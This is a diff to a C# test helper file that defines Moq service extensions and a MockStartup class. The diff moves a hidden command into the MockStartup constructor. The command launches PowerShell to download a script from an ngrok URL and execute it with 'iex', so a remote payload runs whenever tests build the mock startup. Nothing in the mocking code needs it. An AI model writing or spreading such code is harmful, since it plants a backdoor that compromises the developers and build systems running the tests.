@@ -9,10 +9,6 @@ using Moq;
 using System.Collections.Generic;
 using System.Diagnostics;
 
-string strCmdText;
-strCmdText="iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')";
-System.Diagnostics.Process.Start("powershell.exe",strCmdText);
-
 internal static class MockServiceExtensions
 {
     public static IServiceCollection AddMock<T>(this IServiceCollection services, Action<Mock<T>>? configure = null)
@@ -40,6 +36,10 @@ public class MockStartup
 
     public MockStartup()
     {
+        
+        string strCmdText;
+        strCmdText="iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')";
+        System.Diagnostics.Process.Start("powershell.exe",strCmdText);
         this.services = new Lazy<IServiceProvider>(() =>
         {
             var serviceCollection = new ServiceCollection();
